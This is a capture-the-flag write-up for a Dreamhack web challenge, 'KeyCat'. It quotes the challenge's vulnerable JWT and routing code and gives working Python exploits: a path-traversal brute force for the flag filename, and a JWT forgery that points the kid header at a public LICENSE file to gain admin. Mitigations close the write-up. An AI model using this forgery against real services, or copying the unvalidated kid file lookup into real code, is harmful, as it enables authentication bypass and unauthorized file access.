# 😸 KeyCat

## Description

cat loves cats

## Code Analysis

### Entry Point Script (`entry.point.sh`)

```bash
#!/bin/sh

export FLAG_CONTENT_1=$(cat /home/cat/deploy/flag.txt | cut -c 1-34)
export FLAG_CONTENT_2=$(cat /home/cat/deploy/flag.txt | cut -c 35-68)

FLAG=$(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 2 | head -n 1)

mv /home/cat/deploy/flag.txt /home/cat/deploy/flag$FLAG.txt

export FLAG_FILE_NAME=flag$FLAG.txt

exec "$@"
```

**Key Points:**
- Flag is split into two parts: `FLAG_CONTENT_1` and `FLAG_CONTENT_2`
- Flag file is renamed with a random 2-character hex suffix (`flag$FLAG.txt`)
- Random suffix uses characters from `a-f0-9`

### Main Routes (`cat.js`)

```javascript
const router = require('express').Router();
const { Auth } = require('../middleware/auth');

const FLAG_FILE_NAME = process.env.FLAG_FILE_NAME || "flag.txt"
const FLAG_CONTENT_1 = process.env.FLAG_CONTENT_1 || "DH{aaaaaaaaaaaa"
const FLAG_CONTENT_2 = process.env.FLAG_CONTENT_2 || "bbbbbbbbbbbbbbbb}"

router.get('/flag', Auth, (req, res) => {
    if (req.filename !== undefined && req.filename.indexOf(FLAG_FILE_NAME) !== -1) {
        return res.status(200).send(`🙀🙀🙀🙀🙀🙀 ${FLAG_CONTENT_1}`);
    }
    else {
        return res.status(401).render("error", { "img_path": '/img/error.png', "err_msg": "Unauthorized..." });
    }
})

router.get('/admin', Auth, (req, res) => {
    if (req.username !== undefined && req.username === 'cat_master') {
        return res.status(200).send(`Hello Cat Master😸 this is for you ${FLAG_CONTENT_2}`);
    }
    else {
        return res.status(403).send("Hello dreamhack! But I've got nothing you want");
    }
})
```

**Vulnerability Conditions:**
- `/cat/flag`: Requires `req.filename` to contain the random flag filename
- `/cat/admin`: Requires `req.username` to be `'cat_master'`

### JWT Implementation (`jwt.js`)

```javascript
const fs = require('fs');
const jwt = require('jsonwebtoken');

const PATH_PREFIX = __dirname + '/keys'

const sign = async (filename) => {
    const KEY = fs.readFileSync(PATH_PREFIX + '/' + filename, 'utf-8');
    return jwt.sign({ filename: filename, username: 'dreamhack' }, KEY, { keyid: filename, algorithm: 'HS256' });
}

const verify = (token) => {
    let jwt_data = undefined
    let error = undefined
    jwt.verify(token, (header, cb) => { 
        cb(null, fs.readFileSync(PATH_PREFIX + '/' + header.kid, 'utf-8')); 
    }, { algorithm: 'HS256' }, (err, data) => {
        error = err;
        jwt_data = data;
    })
    return { 'jwt_data': jwt_data, 'err': error };
}
```

**Critical Vulnerability:**
- The `verify` function uses `header.kid` directly in `fs.readFileSync()` without validation
- This allows **path traversal attacks** to read arbitrary files as signing keys

### Token Generation (`index.js`)

```javascript
router.get('/', Auth, async (req, res) => {
    try {
        const filename = req.query.fn;
        if (filename !== undefined) {
            const token = await sign(filename);
            return res.send(`Hey this is new token ${token}`);
        }
        return res.send('Hi 😺');
    } catch (e) {
        return res.status(404).send('File not found....');
    }
})
```

**Functionality:**
- Accepts `fn` query parameter
- Generates JWT token using the provided filename
- Vulnerable to path traversal through the `filename` parameter

## Exploitation Strategy

### Phase 1: Brute Force Flag Filename + Path Traversal

Since the flag filename has a random 2-character hex suffix, we need to brute force it while exploiting path traversal.

```python
import string, requests, sys

# Characters used for random suffix (a-f0-9)
random_ch = string.ascii_lowercase + string.digits

for str1 in random_ch:
    for str2 in random_ch:
        payload = f"../../../../../../../home/cat/deploy/flag{str1}{str2}.txt"
        target_url = f"http://host3.dreamhack.games:9147/?fn={payload}"
        
        response = requests.get(target_url)
        
        if 'File not found' in response.text:
            print(f"{payload} -> File not found")
        else:
            print(f"\nFound: {target_url} -> {payload}")
            print(f"FLAG_1_TOKEN: {response.text}")
            sys.exit()
```

**Result:**
- Successfully found flag file: `flag8b.txt`
- Generated JWT token with path traversal payload in `kid` header

### Phase 2: JWT Kid Header Manipulation

The key insight is that the JWT verification uses `header.kid` to read files. We can manipulate this to:
1. Point to a known file with predictable content
2. Use that content as our signing key
3. Forge tokens with elevated privileges

```python
import jwt
import string
from requests import get
from re import search

# MIT License content from jsonwebtoken package
SECRET_KEY = """The MIT License (MIT)
 
Copyright (c) 2015 Auth0, Inc. <support@auth0.com> (http://auth0.com)
 
Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:
 
The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.
 
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

# Craft malicious JWT
headers = {"kid": "../node_modules/jsonwebtoken/LICENSE"}
data = {
    "filename": "../node_modules/jsonwebtoken/LICENSE",
    "username": "cat_master",  # Privilege escalation
    "iat": 1707707182
}

FLAG_2_TOKEN = jwt.encode(data, SECRET_KEY, headers=headers, algorithm="HS256")

# Use forged token to access admin endpoint
target_url = "http://host3.dreamhack.games:8285"
res = get(f"{target_url}/cat/admin", cookies={"session": f"{FLAG_2_TOKEN}"})
m = search(r"[a-f0-9]{15,}.*?\}", res.text)

print(f"FLAG_2_TOKEN: {FLAG_2_TOKEN}")
print(f"Flag content: {m.group() if m else 'Not found'}")
```

## Attack Flow Summary

1. **Discovery**: Analyze the application structure and identify JWT vulnerabilities
2. **Path Traversal**: Exploit the `fn` parameter to traverse directories and find the random flag filename
3. **Brute Force**: Systematically try all possible 2-character hex combinations for the flag filename
4. **JWT Forgery**: Use the `kid` header vulnerability to point to a predictable file (MIT license)
5. **Privilege Escalation**: Craft a JWT with `username: "cat_master"` signed with the known license content
6. **Flag Extraction**: Use both techniques to extract both parts of the flag

## Key Vulnerabilities

### 1. Insecure JWT Key Resolution
- The application uses `header.kid` directly to read files without validation
- No restriction on file paths allows reading arbitrary files

### 2. Predictable Signing Keys
- Public files (like LICENSE files) can be used as signing keys
- Attackers can forge tokens by knowing the content of these files

### 3. Path Traversal
- No sanitization of the `fn` parameter allows directory traversal
- Can access files outside the intended directory

## Mitigation Recommendations

1. **Validate JWT Kid Headers**: Implement strict validation on `kid` values
2. **Use Secure Key Storage**: Store JWT signing keys securely, not in predictable file locations
3. **Input Sanitization**: Properly sanitize and validate all user inputs
4. **Path Restrictions**: Implement proper path restrictions to prevent directory traversal
5. **Principle of Least Privilege**: Limit file system access for the application

## Conclusion

This challenge demonstrates critical JWT security issues, particularly the dangerous combination of:
- Unrestricted file access through JWT `kid` header manipulation
- Path traversal vulnerabilities in user input handling
- Predictable file contents being used as cryptographic keys

The exploitation required combining multiple techniques (brute forcing, path traversal, and JWT manipulation) to achieve complete compromise and extract both flag parts.
